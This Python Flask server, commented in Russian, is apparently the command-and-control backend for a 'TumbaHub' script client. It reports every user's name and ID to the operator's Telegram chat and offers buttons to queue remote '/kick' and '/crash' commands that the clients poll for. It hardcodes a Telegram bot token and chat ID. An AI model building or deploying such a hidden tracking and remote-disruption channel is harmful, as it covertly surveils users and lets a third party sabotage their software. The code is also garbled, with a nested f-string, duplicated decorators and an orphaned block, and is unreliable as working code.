from flask import Flask, request, jsonify
import requests
import json # Обязательно!

commands_queue = {}
awaiting_reason = {} # Память бота

app = Flask(__name__)

# Твои данные
TELEGRAM_TOKEN = '8693862606:AAEvhj2EJeSxHhaw0JopIb_oK-COEZKix1g'
TELEGRAM_CHAT_ID = '8426928414'

# Очередь команд
commands_queue = {}
# Память для ожидания причины кика
awaiting_reason = {}

@app.route('/')
def home():
    return "TumbaHub Server is running!"

@app.route('/api/log_user', methods=['POST'])
def log_user():
    data = request.json
    if not data:
        return jsonify({"status": "error", "message": "No data"}), 400

    username = data.get('username', 'Unknown')
    user_id = data.get('userId', 'Unknown')
    
    if username not in commands_queue:
        commands_queue[username] = []

    msg = f"msg = f"🟢 [V2] НОВЫЙ ЗАПУСК!\n👤 Ник: {username}\n🆔 ID: {user_id}""
    
    # === СОЗДАЕМ КНОПКИ ДЛЯ УПРАВЛЕНИЯ ===
    # В callback_data зашиваем действие и ник, например "kick_Player1"
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "🥾 Kick", "callback_data": f"kick_{username}"},
                {"text": "💥 Crash", "callback_data": f"crash_{username}"}
            ]
        ]
    }

    # Отправляем сообщение вместе с кнопками (параметр reply_markup)
    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                  json={
                      "chat_id": TELEGRAM_CHAT_ID, 
                      "text": msg,
                      "reply_markup": keyboard
                  })

    return jsonify({"status": "success"})

@app.route('/api/get_command', methods=['GET'])
def get_command():
    username = request.args.get('username')
    
    if username in commands_queue and len(commands_queue[username]) > 0:
        cmd = commands_queue[username].pop(0) # Теперь мы достаем просто строку
        return jsonify({"status": "success", "command": cmd})
    
    return jsonify({"status": "empty"})

@app.route('/api/telegram_webhook', methods=['POST'])
def @app.route('/api/telegram_webhook', methods=['POST'])
@app.route('/api/telegram_webhook', methods=['POST'])
def telegram_webhook():
    update = request.json
    
    # Если нажали первую кнопку "Kick"
                if btn_action == "kick":
                    # Включаем режим ожидания текста для этого чата
                    awaiting_reason[chat_id] = target_user
                    
                    # Создаем кнопку для дефолтного кика
                    keyboard = {
                        "inline_keyboard": [
                            [{"text": "Дефолт: Вы были кикнуты", "callback_data": f"defaultkick_{target_user}"}]
                        ]
                    }
                    
                    # ЖЕЛЕЗОБЕТОННАЯ ОТПРАВКА (как мы чинили в первый раз)
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                        data={
                            "chat_id": TELEGRAM_CHAT_ID, 
                            "text": f"Напиши в чат причину кика для {target_user} или нажми кнопку ниже:",
                            "reply_markup": json.dumps(keyboard) # <--- ВОТ ТУТ МАГИЯ
                        }
                    )

    # 2. ОБРАБОТКА НАЖАТИЯ КНОПОК
    if update and "callback_query" in update:
        callback = update["callback_query"]
        chat_id = str(callback["message"]["chat"]["id"])
        data = callback["data"]
        callback_id = callback["id"]
        
        if chat_id == TELEGRAM_CHAT_ID:
            parts = data.split('_', 1)
            if len(parts) == 2:
                btn_action = parts[0]
                target_user = parts[1]
                
                # Если нажали первую кнопку "Kick"
                if btn_action == "kick":
                    # Включаем режим ожидания текста для этого чата
                    awaiting_reason[chat_id] = target_user
                    
                    # Создаем кнопку для дефолтного кика
                    keyboard = {
                        "inline_keyboard": [
                            [{"text": "Дефолт: Вы были кикнуты админом TumbaHub", "callback_data": f"defaultkick_{target_user}"}]
                        ]
                    }
                    
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                        json={
                            "chat_id": TELEGRAM_CHAT_ID, 
                            "text": f"Напиши в чат причину кика для **{target_user}** или нажми кнопку ниже:",
                            "reply_markup": keyboard,
                            "parse_mode": "Markdown"
                        }
                    )
                
                # Если нажали кнопку дефолтного кика
                elif btn_action == "defaultkick":
                    if chat_id in awaiting_reason:
                        del awaiting_reason[chat_id] # Выходим из режима ожидания
                        
                    action = "/kick"
                    if target_user not in commands_queue:
                        commands_queue[target_user] = []
                    commands_queue[target_user].append(action)
                    
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                        json={"chat_id": TELEGRAM_CHAT_ID, "text": f"✅ {target_user} кикнут со стандартной причиной."}
                    )
                    
                # Если нажали Crash
                elif btn_action == "crash":
                    action = "/crash"
                    if target_user not in commands_queue:
                        commands_queue[target_user] = []
                    commands_queue[target_user].append(action)
                    
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                        json={"chat_id": TELEGRAM_CHAT_ID, "text": f"💥 Отправлен краш клиенту {target_user}"}
                    )
                
            # Закрываем загрузку на кнопке
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery",
                json={"callback_query_id": callback_id}
            )

    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
